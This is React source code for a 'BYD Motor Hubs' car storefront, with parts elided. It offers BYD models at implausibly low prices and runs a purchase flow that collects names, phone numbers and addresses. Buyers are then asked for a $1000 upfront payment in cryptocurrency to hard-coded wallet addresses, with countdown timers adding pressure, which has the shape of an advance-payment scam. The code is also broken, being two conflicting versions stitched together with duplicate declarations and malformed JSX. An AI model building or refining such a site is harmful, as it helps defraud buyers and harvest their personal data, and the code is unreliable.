// FULL FIXED VERSION OF YOUR BYD APP // Includes correct icon imports + all JSX syntax corrected

import React, { useState, useEffect } from 'react'; import { motion, AnimatePresence } from 'framer-motion';

// Correct FontAwesome Imports import { FaCopy as Copy, FaTimes as X, FaArrowRight as ArrowRight, FaCar as Car } from "react-icons/fa";

// Image paths const IMAGE_ATTO_3 = "1000307655.jpg"; const IMAGE_DOLPHIN = "1000307656.jpeg"; const IMAGE_YUAN_PLUS = "1000307661.jpeg"; const IMAGE_SEAL = "1000307658.jpg"; const IMAGE_HAN = "1000307659.jpg"; const IMAGE_QIN_PLUS = "1000307660.jpg"; const IMAGE_TANG = "1000307621.jpg"; const FALLBACK_IMAGE = "https://placehold.co/1200x800/e0f2fe/0369a1?text=BYD+EV";

// Cars const CARS = [ { id: 1, name: "BYD Atto 3", range: "250-315 mi", price: "$29,990", availableInUSA: true, img: IMAGE_ATTO_3 }, { id: 2, name: "BYD Dolphin", range: "200-280 mi", price: "$21,990", availableInUSA: true, img: IMAGE_DOLPHIN }, { id: 7, name: "BYD Yuan Plus", range: "180-240 mi", price: "$19,990", availableInUSA: true, img: IMAGE_YUAN_PLUS }, { id: 3, name: "BYD Seal", range: "300-360 mi", price: "$35,990", availableInUSA: false, img: IMAGE_SEAL }, { id: 4, name: "BYD Han", range: "320-380 mi", price: "$39,990", availableInUSA: false, img: IMAGE_HAN }, { id: 5, name: "BYD Qin PLUS", range: "200-330 mi", price: "$25,990", availableInUSA: false, img: IMAGE_QIN_PLUS }, { id: 6, name: "BYD Tang", range: "260-340 mi", price: "$41,900", availableInUSA: false, img: IMAGE_TANG }, ];

// Wallets const CRYPTO_WALLETS = { Bitcoin: { address: 'bc1q4c6f7xzsekkpvd2guwkaww4m7se9yjlrxnrjc7', network: 'BTC' }, Ethereum: { address: '0x08cfe6ddc3b58b0655dd1c9214bcfddbd3855cca', network: 'ETH' }, Litecoin: { address: 'ltc1qattx7q06hrjs7x8jkruyhjw7pavklwetg0j3wl', network: 'LTC' }, USDT_ERC20: { address: '0x08cFE6DDC3b58b0655dD1c9214BcfdDBD3855CCA', network: 'ERC-20' }, };

// Glass card const GlassCard = ({ children, className = '' }) => ( <motion.div whileHover={{ y: -12, scale: 1.02 }} className={bg-white/10 backdrop-blur-2xl border border-white/20 rounded-3xl shadow-2xl overflow-hidden ${className}}
...
// Copy to clipboard const CopyToClipboard = ({ text }) => { const [copied, setCopied] = useState(false); const copy = () => { navigator.clipboard.writeText(text); setCopied(true); setTimeout(() => setCopied(false), 2000); }; return ( <button onClick={copy} className="flex items-center gap-2 text-cyan-400 hover:text-cyan-300 font-medium"> {copied ? 'Copied!' : 'Copy Address'} <Copy className="w-5 h-5" /> </button> ); };

// Main App export default function App() { const [page, setPage] = useState('Home'); const [purchaseActive, setPurchaseActive] = useState(false); const [selectedCar, setSelectedCar] = useState(null); const [step, setStep] = useState(0); const [formData, setFormData] = useState({}); const [selectedCrypto, setSelectedCrypto] = useState(''); const [detailsCar, setDetailsCar] = useState(null);

const startPurchase = (car) => { setSelectedCar(car); setPurchaseActive(true); setStep(1); };

const endPurchase = () => { setPurchaseActive(false); setSelectedCar(null); setStep(0); setFormData({}); setSelectedCrypto(''); };

return ( <> {/* Background */} <div className="fixed inset-0 bg-gradient-to-br from-slate-950 via-blue-950 to-slate-950 -z-10"> <div className="absolute inset-0 bg-gradient-to-r from-cyan-500/20 to-blue-600/20 animate-pulse" /> </div>
...
// Full Purchase Flow Component const FullPurchaseFlow = ({ car, step, setStep, formData, setFormData, selectedCrypto, setSelectedCrypto, onComplete }) => { const [timeLeft, setTimeLeft] = useState(8);

useEffect(() => { if ((step === 5 || step === 9) && timeLeft > 0) { const timer = setTimeout(() => setTimeLeft(timeLeft - 1), 1000); return () => clearTimeout(timer); } else if (timeLeft === 0) { setStep(step === 5 ? 6 : 10); setTimeLeft(8); } }, [timeLeft, step]);

const wallet = CRYPTO_WALLETS[selectedCrypto] || {};

return ( <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="fixed inset-0 z-50 flex items-center justify-center p-6 bg-black/90 backdrop-blur-2xl"> <GlassCard className="max-w-4xl w-full max-h-screen overflow-y-auto p-12"> <button onClick={onComplete} className="absolute top-8 right-8 text-white"><X className="w-10 h-10" /></button> <h2 className="text-5xl font-black mb-8">Purchase: <span className="text-cyan-400">{car.name}</span></h2> <div className="text-3xl font-bold text-cyan-400 mb-12">Step {step} / 10</div>
...
// --- Fallback image if car image fails ---
const FALLBACK_IMAGE = "https://placehold.co/600x400/e0f2fe";
...
const PurchaseFlow = ({ car, onClose }) => {
  ...
  return (
    <div className="fixed inset-0 bg-black bg-opacity-60 flex justify-center items-center p-4 z-50">
      <div className="bg-white rounded-2xl w-full max-w-lg p-6 shadow-xl relative">
        <button onClick={onClose} className="absolute right-4 top-4 text-red-500 text-2xl">
          <X />
        </button>

        {step === 1 && (
          <div>
            <h2 className="text-2xl font-bold mb-4 text-center">Purchase: {car.name}</h2>

            <div className="grid gap-3">
              <input className="border p-2 rounded" placeholder="Full Name" onChange={(e) => updateField("name", e.target.value)} />
              <input className="border p-2 rounded" placeholder="Email" onChange={(e) => updateField("email", e.target.value)} />
              <input className="border p-2 rounded" placeholder="Phone Number" onChange={(e) => updateField("phone", e.target.value)} />
              <select className="border p-2 rounded" onChange={(e) => updateField("gender", e.target.value)}>
                <option value="">Gender</option>
                <option>Male</option>
                <option>Female</option>
              </select>
              <input className="border p-2 rounded" placeholder="Country" onChange={(e) => updateField("country", e.target.value)} />
              <input className="border p-2 rounded" placeholder="State" onChange={(e) => updateField("state", e.target.value)} />
              <input className="border p-2 rounded" placeholder="Address" onChange={(e) => updateField("address", e.target.value)} />
            </div>

            <button
              onClick={() => setStep(2)}
              className="w-full mt-6 bg-blue-600 text-white py-3 rounded-xl flex justify-center items-center gap-2"
            >
              Continue <ArrowRight />
            </button>
          </div>
        ...
        {step === 2 && (
          <div className="text-center">
            ...
            <p className="text-gray-600 mb-4">Pay <b>$1000</b> to proceed with your vehicle purchase.</p>
            <p className="font-semibold">Payment Method:</p>
            <p className="mt-2">PayPal: <b>paypal@example.com</b></p>
            <p>Bitcoin Wallet: <b>bc1q4examplewallet</b></p>
...
export default function App() {
  ...
  return (
    <div className="min-h-screen bg-gray-100 p-4">
      <h1 className="text-4xl font-bold text-center text-blue-700 mb-6">BYD Motor Hubs</h1>

      <div className="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
        {CARS.map((car) => (
          <div key={car.id} className="bg-white rounded-2xl shadow p-4">
            <img
              src={car.image}
            ...
            <p className="text-gray-600">Range: {car.range}</p>
            <p className="text-blue-700 font-semibold">Price: {car.price}</p>

            <button
              onClick={() => setSelectedCar(car)}
              className="w-full bg-blue-600 text-white py-3 rounded-xl mt-4 flex items-center justify-center gap-2"
            >
              Purchase <Car />
            </button>
          </div>
